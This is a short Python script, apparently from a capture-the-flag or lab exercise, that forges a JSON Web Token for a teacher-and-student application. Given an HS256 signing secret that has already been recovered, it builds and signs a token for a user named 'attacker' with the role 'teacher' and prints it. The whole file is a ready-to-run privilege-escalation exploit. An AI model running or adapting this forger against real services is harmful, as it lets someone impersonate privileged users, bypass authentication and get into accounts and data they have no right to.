#!/usr/bin/env python3
"""Sign a forged teacher JWT with a recovered HS256 secret.

Usage: python3 forge_hs256.py <secret>
"""
import base64
import hashlib
import hmac
import json
import sys


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


secret = sys.argv[1].encode()
header = {"alg": "HS256", "typ": "JWT"}
payload = {"user_id": 9999, "username": "attacker", "role": "teacher"}

h = b64url(json.dumps(header, separators=(",", ":")).encode())
p = b64url(json.dumps(payload, separators=(",", ":")).encode())
signature = b64url(hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest())
print(f"{h}.{p}.{signature}")
